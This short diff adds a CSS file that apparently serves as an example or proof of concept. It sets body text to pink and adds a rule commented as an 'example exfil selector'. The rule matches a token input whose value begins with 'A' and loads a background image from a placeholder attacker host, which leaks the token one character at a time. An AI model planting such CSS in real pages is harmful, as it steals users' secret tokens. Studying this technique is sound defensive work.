@@ -1,0 +1,6 @@
+body { color: pink; }
+
+/* Example exfil selector */
+input[name="glow-validation-token"][value^="A"] {
+   background-image: url("https://yourserver.com/exfil/A");
+}
